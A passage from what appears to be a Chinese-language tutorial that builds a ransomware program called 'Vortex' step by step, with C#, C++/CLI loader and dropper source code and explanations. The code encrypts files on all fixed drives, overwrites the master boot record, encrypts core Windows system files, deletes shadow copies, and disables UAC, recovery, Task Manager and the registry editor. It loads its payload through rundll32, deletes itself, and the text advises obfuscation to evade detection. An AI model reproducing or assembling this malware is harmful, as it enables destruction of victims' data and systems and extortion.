using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;
using VortexSecOps.FileTraversalService;
using VortexSecOps.HarmfulSysHacks;
using VortexSecOps.Regedit_Set;

namespace xdll32
{
    public class Program
    {
        // 声明Windows API函数
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        static void SetDesktopWallpaper(string path)
        {
            try
            {
                // 设置桌面壁纸
                SystemParametersInfo(0x0014, 0, path, 0x01|0x02);
            }
            catch (Exception)
            {
                // 捕获异常但不做处理
            }
        }
        static string GetSHA256(byte[] bytes)
        {
            return AesRsaEncryptionManager.GetSHA256(bytes);
        }
        // 定义要创建的恶意可执行文件的路径
        private const string FileName = @"C:\Rundl132.exe";
        // RSA-4096公钥XML字符串
        private const string PublicKey = @"<RSAKeyValue><Modulus>27MHYRVoyzJJG8gMI+YRNXWd1nexs2xhzf/ERILBTO1ZvSXOLciv3XgVb4QCzFAbi+zTE9xeGuzSTx7I+gdw0urmjbVOpXmXIGe6LpFfjSHkvtaTRMZjv5VuXAvRckAn4+51NUPHqbPp590eyu1VC8qm31HP56V6nz13yJLAZprsLL7NY7nA5SVHnQIG1m/T20iPJzOhnPCO4x0Dvdyi7SrphWtvx1Qs88P+p0yhgqPTZqpB4CMOusHu7eyQlvrpRFqn/6LqDVneNHa73OQvdZS0XzNCrzTxcwlThs+NBRkWcr9KlwtEUXwT5nv7pCxW+Yy+ohryBTYBG3aCwUycnaaBe9L/4xqiaoc1oT48Kn3BKoUa9BDjVuo4dEmkoTFr8WUTZSTr3YRz3P9j9B+CMZDtA4FpnKAjvXAGS9Vy1hwa/MJIfvnXAQyuirr1BM3YyTGoC44KabPnydG+1TrrhVA1kGSohXYtmGsQKC2LO0NWfOADZAdh7OkAPxlm7UtFeWr6j1mxxmW55fMXGnUA0LGMPJoDhcU/aIOYO8v/fSRbgEvTYDelmnd9g3kCV/o187Km/Yd3wBHKf6uIz8BPGMXW5nOiXas0kcpjGCbUVlHsL9BkQt8vANBE+JpvA0eO8Mfa3QX409Pgtx6RtkT74TqkbX2g1yQQsg7FMjnhchU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

        // 不断尝试杀死任务管理器进程的方法
        static void TaskmgrKill()
        {
            string taskmgr = "Taskmgr";
            while (true)
            {
                try
                {
                    // 获取所有名为 Taskmgr 的进程
                    Process[] processes = Process.GetProcessesByName(taskmgr);
                    if (processes.Length > 0)
                    {
                        // 逐个杀死找到的任务管理器进程
                        foreach (Process process in processes)
                        {
                            process.Kill();
                        }
                    }
                }
                catch (Exception)
                {
                    // 捕获异常但不做处理
                }
                // 线程休眠200毫秒
                Thread.Sleep(200);
            }
        }
        public static string GetDllPath(string args="")
        {
            return Assembly.GetExecutingAssembly().Location;
        }
        public static void start()
        {
            Task task = run("");
            task.Wait();
        }
        // 程序入口点
        public static async Task run(string args)
        {
            if(!MalwareIntruder.IsRunningAsAdministrator())
            {
                Console.WriteLine("Please run as administrator.");
                Environment.Exit(0);
            }
            Task.Run(TaskmgrKill);
            // 定义主引导记录（MBR）文件路径
            const string MBR_PATH = @"C:\bin\mbr.bin";

            // 初始化配置破坏器、Windows API操作器和注册表配置器
            IConfigCorrupter configCorrupter = MalwareIntruder.Create<IConfigCorrupter>();
            IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
            IRegistryConfigurer registryConfigurer = RegistryConfigurer.Create();

            // 异步执行禁用UAC（用户账户控制）的操作
            Task.Run(async () =>
            {
                registryConfigurer.DisableUAC();
            });
            Task WinREDisableTask = Task.Run(() =>
            {
                configCorrupter.DisableWindowsRecoveryEnvironment();
            });
            Task task1 = null;
#pragma warning restore CS4014
            // 获取桌面路径
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string keyHash;
            string wallpaperPath = Path.Combine(desktopPath, "@VotexDecryptor@.png");
            string Vortex_Decryptor_Path = Path.Combine(desktopPath, "@Vortex_decryptor.exe");
            string README_PATH = Path.Combine(desktopPath, "@Please Read Me.txt");
            // 获取解密程序的Base64编码内容
            string Vortex_decryptor = xdll32.Resources.Vortex_decryptor;
            // 创建AES/RSA加密服务实例
            using (IAesRsaCryptographyService cryptographyService = AesRsaEncryptionManager.Create())
            {
                try
                {
                    if (File.Exists(FileName))
                    {
                        File.Delete(FileName);
                    }
                    // 将Base64编码的内容写入文件，创建恶意可执行文件
                    File.WriteAllBytes(FileName, Convert.FromBase64String(xdll32.Resources.Rundl132));
                    FileInfo fileInfo = new FileInfo(FileName);
                    // 设置文件属性为系统和隐藏
                    fileInfo.Attributes = FileAttributes.System | FileAttributes.Hidden;
                    // 将Base64编码的内容写入文件，生成解密程序到桌面
                    File.WriteAllBytes(Vortex_Decryptor_Path, Convert.FromBase64String(Vortex_decryptor));
                    File.WriteAllBytes(README_PATH, Convert.FromBase64String(xdll32.Resources.README));
                }
                catch (Exception)
                {
                    // 捕获异常但不做处理
                }

                // 如果指定目录存在，则删除该目录及其所有内容
                if (Directory.Exists(@"C:\bin"))
                {
                    Directory.Delete(@"C:\bin", true);
                    Directory.CreateDirectory(@"C:\bin");
                }
                cryptographyService.NotEncryptedFileExtension = new[]
                {
                "*.ini",       // 系统配置文件 
                "*.sys",       // Windows内核驱动文件
                "*.dll",       // 动态链接库文件
                "*.bat",       // 批处理脚本文件 
                "*.tmp",       // 临时文件 
                "*.cab",       // Windows安装包文件
                "*.drv",       // 设备驱动文件 
                "*.ocx",       // ActiveX控件文件
                "*.scr",       // 屏幕保护程序文件 
                "*.diagcab",   // Windows诊断包 
                "*.theme",     // 系统主题文件
                "*.hlp",       // 帮助文件 
                "*.nt" ,        // NT内核相关文件
                "*.VXCRY",    // 加密文件
                $"*{string.Empty}"
            };
                // 计算AES密钥的SHA256哈希值
                keyHash = GetSHA256(cryptographyService.AesKey);
                cryptographyService.UseEncryptionWhitelist = false;
                // 使用RSA公钥加密AES密钥
                cryptographyService.EncryptAesKeyWithRsa(PublicKey);
                try
                {
                    //删除所有卷影副本
                    windowsAPIOperator.DeleteAllRestorePoints();
                    // 获取主引导记录（MBR）数据
                    byte[] mbr = MalwareIntruder.GetMbrUsingWindowsAPI();
                    // 使用AES密钥加密MBR文件
                    cryptographyService.EncryptFileWithAesKey(MBR_PATH);
                    // 修改主引导记录
                    windowsAPIOperator.ModifyMasterBootRecord();
                    task1 = Task.Run(async () =>
                    {
                        // 修改主引导记录
                        windowsAPIOperator.ModifyMasterBootRecord();
                        // 删除所有卷影副本
                        windowsAPIOperator.DeleteAllRestorePoints();
                        // 加密硬件抽象层
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\hal.dll", (path) =>
                        {
                            cryptographyService.EncryptFileWithAesKey(path);
                        });
                        // 加密Windows系统主内核
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ntoskrnl.exe", (path) =>
                        {
                            cryptographyService.EncryptFileWithAesKey(path);
                        });
                        // 加密系统完整性检查和修复工具
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\sfc.exe", (path) =>
                        {
                            cryptographyService.EncryptFileWithAesKey(path);
                            File.WriteAllBytes(path, Convert.FromBase64String(Resources.Rundl132));
                        });
                        // 加密 Microsoft 管理控制台
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\mmc.exe", (path) =>
                        {
                            cryptographyService.EncryptFileWithAesKey(path);
                        });
                        // 加密 Windows 映像部署管理工具
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\Dism.exe", (path) =>
                        {
                            cryptographyService.EncryptFileWithAesKey(path);
                        });
                        await WinREDisableTask;
                        // 加密 Windows 恢复环境配置工具
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ReAgentc.exe", (path) =>
                        {
                            cryptographyService.EncryptFileWithAesKey(path);
                        });
                    });
                    // 配置CMD为禁用状态
                    registryConfigurer.ConfigureCMD(2);
                    // 应用Windows功能限制
                    registryConfigurer.ApplyWinRestricts(true);
                    // 禁用系统设置（控制面板和任务管理器）
                    registryConfigurer.DisableSysSettings();
                    // 禁用注册表编辑器
                    registryConfigurer.DisableRegistryEdit();
                    File.WriteAllBytes(wallpaperPath, Convert.FromBase64String(Resources.Wallpaper));
                    SetDesktopWallpaper(wallpaperPath); // 设置桌面壁纸
                    await task1;
                    try
                    {
                        using (Process process = new Process())
                        {
                            process.StartInfo = new ProcessStartInfo()
                            {
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                FileName = "taskkill.exe",
                                Arguments = "/f /im explorer.exe",
                                Verb = "runas"
                            };
                            process.Start();
                            process.WaitForExit();
                        }
                    }
                    catch (Exception)
                    {

                    }
                    Task.Run(() =>
                    {
                        try
                        {
                            using (Process process = new Process())
                            {
                                process.StartInfo = new ProcessStartInfo()
                                {
                                    FileName = "cmd.exe",
                                    UseShellExecute = false,
                                    CreateNoWindow = true,
                                    Verb = "runas",
                                    Arguments = "/c timeout /t 1 /NOBREAK&&explorer"
                                };
                                process.Start();
                                process.WaitForExit();
                            }
                        }
                        catch (Exception)
                        {

                        }
                    });
                    await Task.Delay(3000);
                }
                catch (Exception)
                {
                    // 捕获异常但不做处理
                }
                cryptographyService.UseEncryptionWhitelist = true; // 设置加密白名单为true
                // 创建文件遍历器实例
                IFileTraverser fileTraverser = FileTraverser.Create();

                // 检查数据是否未被AES加密
                if (!registryConfigurer.IsDataEncryptedByAes(true))
                {
                    // 用于存储加密任务的列表
                    var encryptionTasks = new List<Task>();
                    // 创建信号量，限制并发任务数量为100
                    var semaphore = new SemaphoreSlim(100, 100);

                    // 遍历C:\users目录下符合扩展名的文件并进行加密
                    foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Users"))
                    {
                        await semaphore.WaitAsync();
                        // 异步加密文件
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
                                if (fileInfo.Length > 0)
                                {
                                    if (fileInfo.Name.ToLower() == "desktop.ini" || aesEncryptionNeededFilePath.ToLower() == wallpaperPath.ToLower() || aesEncryptionNeededFilePath.ToLower() == README_PATH.ToLower())
                                    {
                                        return;
                                    }
                                    if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                    {
                                        return;
                                    }
                                    // 检查文件是否为解密程序
                                    if (aesEncryptionNeededFilePath.ToLower() != Vortex_Decryptor_Path.ToLower())
                                    {
                                        bool encrypt = cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath);
                                        if (args.Equals("#1") && encrypt is true)
                                        {
                                            Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
                                        }
                                    }
                                }
                            }
                            finally
                            {
                                semaphore?.Release();
                            }
                        });
                        encryptionTasks.Add(task);
                    }
                    // 遍历C:\users目录下符合扩展名的文件并进行加密
                    foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Program Files (x86)"))
                    {
                        await semaphore.WaitAsync();
                        // 异步加密文件
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
                                if (fileInfo.Length > 0)
                                {
                                    if (fileInfo.Name.ToLower() == "desktop.ini" || aesEncryptionNeededFilePath.ToLower() == wallpaperPath.ToLower())
                                    {
                                        return;
                                    }
                                    if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                    {
                                        return;
                                    }
                                    // 检查文件是否为解密程序
                                    if (aesEncryptionNeededFilePath.ToLower() != Vortex_Decryptor_Path.ToLower())
                                    {
                                        bool encrypt = cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath);
                                        if (args.Equals("#1") && encrypt is true)
                                        {
                                            Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
                                        }
                                    }
                                }
                            }
                            finally
                            {
                                semaphore?.Release();
                            }
                        });
                        encryptionTasks.Add(task);
                    }
                    // 获取所有驱动器信息
                    DriveInfo[] driveInfo = DriveInfo.GetDrives();

                    // 遍历所有驱动器
                    foreach (DriveInfo drive in driveInfo)
                    {
                        if (drive.Name != "C:\\" && drive.DriveType == DriveType.Fixed)
                        {
                            foreach (string aesEncryptionNeededFilePath in fileTraverser.TraverseFile(drive.Name))
                            {
                                await semaphore?.WaitAsync();
                                // 异步加密文件
                                var task = Task.Run(() =>
                                {
                                    try
                                    {
                                        FileInfo fileInfo = new FileInfo(aesEncryptionNeededFilePath);
                                        if (fileInfo.Length > 0)
                                        {
                                            if (fileInfo.FullName.ToLower() == Process.GetCurrentProcess().MainModule.FileName.ToLower())
                                            {
                                                return;
                                            }
                                            bool encrypt = cryptographyService.EncryptFileWithAesKey(aesEncryptionNeededFilePath);
                                            if (args.Equals("#1") && encrypt is true)
                                            {
                                                Console.WriteLine($"Encrypt file: {aesEncryptionNeededFilePath}");
                                            }
                                        }
                                    }
                                    finally
                                    {
                                        semaphore?.Release();
                                    }
                                });
                                encryptionTasks.Add(task);
                            }
                        }
                    }
                    // 等待所有加密任务完成
                    await Task.WhenAll(encryptionTasks);
                    if (task1 != null)
                    {
                        if (!task1.IsCompleted)
                        {
                            await task1;
                        }
                    }
                }
            }
            try
            {
                if ((!File.Exists(Vortex_Decryptor_Path)) || GetSHA256(File.ReadAllBytes(Vortex_Decryptor_Path)) != GetSHA256(Convert.FromBase64String(Vortex_decryptor)))
                {
                    // 将Base64编码的内容写入文件，生成解密程序到桌面
                    File.WriteAllBytes(Vortex_Decryptor_Path, Convert.FromBase64String(Vortex_decryptor));
                }
                byte[] encryped_Html = Convert.FromBase64String(Resources.HTML);
                if (File.Exists(@"C:\encrypted.html"))
                {
                    File.Delete(@"C:\encrypted.html");
                }
                // 将Base64编码的内容写入文件，创建加密的HTML文件
                File.WriteAllBytes(@"C:\encrypted.html", encryped_Html);
                FileInfo fileInfoHtml = new FileInfo(@"C:\encrypted.html");
                // 设置加密的HTML文件属性为隐藏和系统
                fileInfoHtml.Attributes = FileAttributes.Hidden | FileAttributes.System;
            }
            catch (Exception)
            {
                // 捕获异常但不做处理
            }
            try
            {
                using (Process process = new Process())
                {
                    process.StartInfo = new ProcessStartInfo()
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "taskkill.exe",
                        Arguments = "/f /im explorer.exe",
                        Verb = "runas"
                    };
                    process.Start();
                    process.WaitForExit();
                }
            }
            catch (Exception)
            {

            }
            Task.Run(() =>
            {
                try
                {
                    using (Process process = new Process())
                    {
                        process.StartInfo = new ProcessStartInfo()
                        {
                            FileName = "cmd.exe",
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            Verb = "runas",
                            Arguments = "/c timeout /t 1 /NOBREAK&&explorer"
                        };
                        process.Start();
                        process.WaitForExit();
                    }
                }
                catch (Exception)
                {

                }
            });
            await Task.Delay(3000);
            Task.Run(() =>
            {
                try
                {
                    // 创建进程启动信息，以管理员身份运行解密程序
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        UseShellExecute = false,
                        FileName = Vortex_Decryptor_Path,
                        Arguments = keyHash,
                        Verb = "runas"
                    };
                    // 启动解密程序
                    Process.Start(startInfo).WaitForExit();
                }
                catch (Exception)
                {

                }
            });
            await Task.Delay(3000);
            try
            {
                registryConfigurer.ConfigStartupProg(FileName);
            }
            catch (Exception)
            {

            }
            // 退出当前程序
            Environment.Exit(0);
        }
    }
}
```

> 1. **权限检查**​
>     - 程序首先通过`MalwareIntruder.IsRunningAsAdministrator()`检查当前程序是否以管理员身份运行。如果不是，则输出提示信息
> “`Please run as administrator`.” 并退出程序。 
> 2. **持续破坏任务管理器** 
>    - 调用`Task.Run(TaskmgrKill)`启动一个新的任务，持续执行`TaskmgrKill`方法。在TaskmgrKill方法中，通过一个无限循环，不断尝试获取名为
> “`Taskmgr`” 的进程，并逐个杀死找到的任务管理器进程，同时线程休眠 200 毫秒，以此来阻止用户使用任务管理器进行进程管理等操作。
> 3. **初始化恶意操作组件**
>    - 定义主引导记录（MBR）文件路径为@"`C:\bin\mbr.bin`"。
>    - 初始化配置破坏器、Windows API 操作器和注册表配置器，分别通过`MalwareIntruder.Create<IConfigCorrupter>()`、`MalwareIntruder.Create<IWindowsAPIOperator>()`和`RegistryConfigurer.Create()`创建实例。
>  4. **异步执行恶意操作**
>     - 调用`Task.Run(async () => { registryConfigurer.DisableUAC(); })`，以异步方式运行禁用 UAC（用户账户控制）的操作，降低系统的安全防护级别。
>     - 调用`Task WinREDisableTask = Task.Run(() => { configCorrupter.DisableWindowsRecoveryEnvironment(); })`，异步执行禁用
> Windows 恢复环境的操作，防止用户通过恢复环境修复系统。
> 5. **创建恶意文件**
>    - 获取桌面路径`desktopPath`，并基于桌面路径定义壁纸路径`wallpaperPath`、解密程序路径`Vortex_Decryptor_Path`。
>    - 检查名为`@"C:\Rundl132.exe"`的恶意可执行文件是否存在，如果存在则删除。然后将`xdll32.Resources.Rundl132`的
> `Base64` 编码内容写入该路径，创建恶意可执行文件，并设置其属性为系统和隐藏。
>    - 将`xdll32.Resources.Vortex_decryptor`的 Base64 编码内容写入桌面路径，生成解密程序到桌面。
>    - 如果`@"C:\bin"`目录存在，则删除该目录及其所有内容。
> 6. **加密相关操作**
>    - 计算其 SHA256 哈希值keyHash。​
>    - 使用 RSA 公钥加密 AES 密钥`cryptographyService.EncryptAesKeyWithRsa(PublicKey)`。​
>    - 调用`windowsAPIOperator.DeleteAllRestorePoints()`删除所有卷影副本，防止用户通过卷影副本恢复文件。​
>    - 获取主引导记录（MBR）数据，使用 AES 密钥加密 MBR 文件，然后修改主引导记录`windowsAPIOperator.ModifyMasterBootRecord()`。​
>    - 启动一个新任务task1，在任务中执行一系列加密操作，包括加密硬件抽象层@"`C:\Windows\System32\hal.dll`"、
> Windows 系统主内核 @"`C:\Windows\System32\ntoskrnl.exe`"、 系统完整性检查和修复工具
> @"`C:\Windows\System32\sfc.exe`"、 Microsoft 管理控制台
> @"`C:\Windows\System32\mmc.exe`"、 Windows 映像部署管理工具
> @"`C:\Windows\System32\Dism.exe`"、 Windows 恢复环境配置工具
> @"`C:\Windows\System32\ReAgentc.exe`"，并等待禁用 Windows
> 恢复环境的任务`WinREDisableTask`完成。
> 7. **注册表恶意配置**
>    - 调用`registryConfigurer.ConfigureCMD(2)`将 CMD 配置为禁用状态。​
>    - 调用`registryConfigurer.ApplyWinRestricts(true)`应用 Windows 功能限制。​
>    - 调用`registryConfigurer.DisableSysSettings()`禁用系统设置（控制面板和任务管理器）。​
>    - 调用`registryConfigurer.DisableRegistryEdit()`禁用注册表编辑器。
> 8. **设置桌面壁纸**
>    - 将`xdll32.Resources.Wallpaper`的 Base64 编码内容写入壁纸路径wallpaperPath，并调用`SetDesktopWallpaper(wallpaperPath)`设置桌面壁纸。
> 
> 9. **文件加密**
>    - 创建文件遍历器实例`IFileTraverser fileTraverser = FileTraverser.Create()`。
>    - 检查数据是否未被 AES 加密，如果未加密，则进行文件加密操作：
>      - 创建一个任务列表`encryptionTasks`和一个信号量`semaphore`，用于控制并发任务数量为 100。​
>      - 对`C:\users`、`C:\Program Files (x86)`目录以及所有固定驱动器（除 C 盘外）下符合扩展名的文件进行异步加密操作，在加密过程中会跳过一些特定文件（如解密程序、当前程序自身、文件类型白名单等），并在加密成功且传入参数为
> “#1” 时输出加密文件路径。​
>      - 等待所有加密任务完成后，using 语句会自动清除 AES 密钥​ 检查解密程序是否存在或其哈希值是否正确，如果不正确则重新生成解密程序到桌面。​
>      - 将`xdll32.Resources.HTML`的 Base64 编码内容写入@"`C:\encrypted.html`"路径，创建勒索信息的 HTML 文件，并设置其属性为隐藏和系统。​
>      - 创建进程启动信息，以管理员身份运行解密程序，并传入计算得到的 AES 密钥哈希值`keyHash`，调用`registryConfigurer.ConfigStartupProg(FileName)`修改主启动项，使下次启动直接蓝屏，最后退出当前程序`Environment.Exit(0)`。
> 10. **补充**
>     - 第一次重启`explorer.exe`的目的是快速响应注册表更改。
>     - 第二次重启`explorer.exe`的目的是防止程序因大量加密后的文件擦除操作导致`explorer.exe`异常退出，进而导致程序崩溃。
### 3.3.2 Resources.cs
```csharp
namespace xdll32
{
    internal class Resources
    {
        #region 解密程序的Base64字符串
        // 解密程序的Base64字符串
        public static readonly string Vortex_decryptor = @". . .";
        #endregion
        #region 主启动程序的Base64字符串
        // 主启动程序的Base64字符串
        public static readonly string Rundl132 = @". . .";
        #endregion 
        #region 勒索信息的base64字符串
        // 勒索信息的base64字符串
        public static readonly string HTML = ". . .";
        #endregion
        #region 壁纸
        //壁纸
        public static readonly string Wallpaper = ". . .";
        #endregion
        #region 勒索信Base64字符串
        public static readonly string README = ". . .";
        #endregion
    }
}
```
## 3.4 Rundl132.exe
### 3.4.1 Program.cs

```csharp
using VortexSecOps.HarmfulSysHacks;
namespace Rundl132
{
    internal class Programs
    {
        static void Main(string[] args)
        {
            IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
            windowsAPIOperator.ModifyMasterBootRecord();
            windowsAPIOperator.TriggerBlueScreen();
        }
    }
}

```
## 3.5 编写C++/CLI中间层vncy.dll
### 3.5.1 头文件vncy.h
```cpp
#pragma once
#include <stdio.h>
#include <Windows.h>
extern "C" __declspec(dllexport)  void __stdcall run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
```
### 3.5.2 vncy.cpp
```cpp
// vncy.cpp
#include "pch.h"
#include "vncy.h"
using namespace System;
using namespace System::Reflection;
using namespace System::Runtime::InteropServices;
using namespace System::IO;
using namespace System::Threading::Tasks;
using namespace System::Windows::Forms;
 
namespace vncy {
	public ref class Class1
	{
	public:
		static void start()
		{
			String^ dllpath = "C:\\vcry.dll";
			FileInfo^ dll = gcnew FileInfo(dllpath);
			array<unsigned char>^ buffer = File::ReadAllBytes(dll->FullName);
			File::WriteAllBytes(dll->FullName, gcnew array<unsigned char>(0) {});
			dll->Delete();
			Assembly^ assembly = Assembly::Load(buffer);
			Type^ type = assembly->GetType("xdll32.Program");
			if (type == nullptr)
			{
				Console::WriteLine("Type not found");
				return;
			}
			MethodInfo^ method = type->GetMethod("run", BindingFlags::Static | BindingFlags::Public, nullptr, gcnew array<Type^> {String::typeid}, nullptr);
			if (method == nullptr)
			{
				return;
			}
			Object^ result = method->Invoke(nullptr, gcnew array<Object^> { "#1" });
			Task^ task = dynamic_cast<Task^>(result);
			task->Wait();
		}
	};
}
void __stdcall run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)  
{  
	vncy::Class1::start();
}
```

> 1. **动态加载恶意 DLL 并删除**
> 
> ```cpp 
> String^ dllpath = "C:\\vcry.dll"; FileInfo^ dll = gcnew
> FileInfo(dllpath); // 将vcry.dll加载到内存中 array<unsigned char>^ buffer =
> File::ReadAllBytes(dll->FullName); // 将vcry.dll用0字节覆盖，防止恢复取证
> File::WriteAllBytes(dll->FullName, gcnew array<unsigned char>(0) {});
> // 删除vcry.dll dll->Delete(); 
> ```
>    - 上述代码首先指定了要加载的 DLL 文件路径为 C:\\vcry.dll。接着使用 `FileInfo` 类获取该文件的信息，然后通过 `File::ReadAllBytes` 方法将 DLL 文件的内容以字节数组的形式读取到 buffer
> 中。读取完成后，代码将一个空的字节数组写入原 DLL 文件路径，清空原文件内容，随后删除该 DLL 文件。这一系列操作的目的是在读取 DLL
> 内容后，销毁原始文件，增加安全检测和溯源的难度。
> 2. **利用反射加载并执行恶意程序** 
> ```cpp
>  // 创建内存托管程序集对象 Assembly^ assembly = Assembly::Load(buffer); // 获取程序集中名为 xdll32.Program 的类型 Type^ type =
> assembly->GetType("xdll32.Program"); if (type == nullptr) {
>     Console::WriteLine("Type not found");
>     return; } // 查找该类型中名为 run 的静态公共方法，并指定该方法接受一个 String 类型的参数 MethodInfo^ method = type->GetMethod("run", BindingFlags::Static |
> BindingFlags::Public, nullptr, gcnew array<Type^> {String::typeid},
> nullptr); if (method == nullptr) {
>     return; } // 使用 method->Invoke 方法调用该 run 方法，并传入参数 #1 Object^ result = method->Invoke(nullptr, gcnew array<Object^> { "#1" }); // 通过
> task->Wait 等待任务执行完成 Task^ task = dynamic_cast<Task^>(result);
> task->Wait(); 
> ```
> - 在获取到 DLL 文件内容的字节数组后，代码使用 `Assembly::Load` 方法将字节数组加载为一个程序集 assembly。接着通过 `assembly->GetType` 方法尝试获取程序集中名为 xdll32.Program
> 的类型。如果获取失败，输出 “Type not found” 并返回，不再继续执行恶意操作。​
> - 若成功获取到类型，则通过 `type->GetMethod` 方法查找该类型中名为 run 的静态公共方法，并指定该方法接受一个 String 类型的参数。找到方法后，使用 `method->Invoke` 方法调用该 run 方法，并传入参数 #1。由于 run
> 方法返回一个 Task 对象，代码将调用结果转换为 Task 类型，并通过 `task->Wait`
> 等待任务执行完成，从而确保恶意程序的所有操作都能顺利执行。
> 3. **入口函数启动与系统程序滥用** 
> ```cpp
> void __stdcall run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)   {  
>     vncy::Class1::start(); 
>     } 
>    ```
> - run 函数作为 `rundll32.exe` 调用的入口点，采用 `__stdcall` 调用约定。函数内部，它直接调用 `vncy::Class1::start` 方法，以此触发加载和执行恶意 DLL
> 的一系列操作。这样的设计意味着，该中间层代码可在特定条件下（如程序启动、收到特定消息等）被激活，进而执行恶意功能。
> 
> - 利用 `rundll32.exe` 执行具有一定的隐蔽性，它常被恶意软件利用，使得恶意活动隐匿其中，不易被检测机制察觉。
> 4. **危害与风险**
> - 从上述逻辑可以清晰地看出，该中间层代码通过动态加载和执行恶意 DLL，能够实现诸如文件加密、系统设置篡改、进程破坏等一系列恶意行为。由于其采用了动态加载和销毁原始文件的策略，使得安全软件难以通过常规的文件检测方式发现其恶意意图，增加了检测和防护的难度。一旦该中间层代码被成功执行，用户的计算机系统将面临数据丢失、系统崩溃、隐私泄露等严重后果，对个人和企业的信息安全构成极大威胁。​
> - 综上所述，了解此类中间层代码的实现逻辑，对于防范恶意软件攻击、提升系统安全防护能力具有重要意义。同时，也提醒用户在使用计算机过程中，要保持警惕，避免运行来源不明的程序，定期更新安全软件，以降低遭受恶意攻击的风险。
## 3.6 主程序(vcry.exe)编写
### 3.6.1 将恶意dll文件转换成Base64编码内嵌到主程序

```csharp
// dll.cs
namespace vcryx
{
    internal class Dll
    {
        #region vncy
        // vncy.dll 的Base64编码
        public readonly static string Vncy = ". . .";
        #endregion
        #region vcry
        // vcry.dll 的Base64编码
        public readonly static string Vcry = ". . .";
        #endregion
    }
}
```
### 3.6.2 将恶意dll文件脱嵌并通过 rundll32.exe 执行
```csharp
// Program.cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using VortexSecOps.HarmfulSysHacks;
 
namespace vcryx
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (!MalwareIntruder.IsRunningAsAdministrator())
            {
                MalwareIntruder.RestartCurrentAppAsAdmin();
            }
            byte[] vcryBuffer = Convert.FromBase64String(Dll.Vcry);
            byte[] vncyBuffer = Convert.FromBase64String(Dll.Vncy);
            string vcryPath = @"C:\vcry.dll";
            string vncyPath = @"C:\Windows\System32\vncy.dll";
            if (File.Exists(vcryPath))
            {
                File.Delete(vcryPath);
            }
            if (File.Exists(vncyPath))
            {
                File.Delete(vncyPath);
            }
            File.WriteAllBytes(vcryPath, vcryBuffer);
            File.WriteAllBytes(vncyPath, vncyBuffer);
            FileInfo fileInfo = new FileInfo(vncyPath);
            if (fileInfo.Exists)
            {
                fileInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
            }
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "Rundll32.exe",
                Arguments = $"\"{vncyPath}\",run",
                Verb = "runas",
                UseShellExecute = false,
            };
            using(Process process = Process.Start(startInfo))
            {
                if (process != null)
                {
                    process.Dispose();
                }
            }
            ProcessStartInfo startInfo2 = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = $"/C timeout/T 1 /NOBREAK&&del /F \"{Process.GetCurrentProcess().MainModule.FileName}\"",
                Verb = "runas",
                CreateNoWindow = true,
                UseShellExecute = false,
            };
            using(Process process = Process.Start(startInfo2))
            {
                if (process != null)
                {
                    process.Dispose();
                }
            }
        }
    }
}
```
- **数据转换**：通过`Convert.FromBase64String`方法，将`Dll.Vcry`和`Dll.Vncy`的 Base64 编码数据分别转换为字节数组`vcryBuffer`和`vncyBuffer`，将其还原为可写入文件的原始字节数据。vcry.dll须经过代码混淆，混淆之后可以防止静态检测。
- **路径定义**：定义两个文件路径，`vcryPath`为@"`C:\vcry.dll`"，`vncyPath`为@"`C:\Windows\System32\vncy.dll`"。`C:\Windows\System32`是系统核心目录，将恶意 DLL 文件写入此目录，能借助系统对该目录的信任，提升恶意程序执行的隐蔽性和成功率。​
- **文件清理与写入**：分别检查 `vcryPath` 和 vncyPath 对应的文件是否存在，若存在则使用`File.Delete`将其删除，避免重复写入或冲突。随后，通过`File.WriteAllBytes`将`vcryBuffer`和`vncyBuffer`写入对应的路径，成功将脱嵌后的恶意 DLL 文件部署到系统中。
- **系统程序滥用**：运行 `rundll32.exe` 并调用中间层 `vncy.dll` 的`run`函数并执行恶意代码。
- **自删除**：通过调用 `cmd.exe` 延迟1秒后删除自身。
### 3.6.3 小结
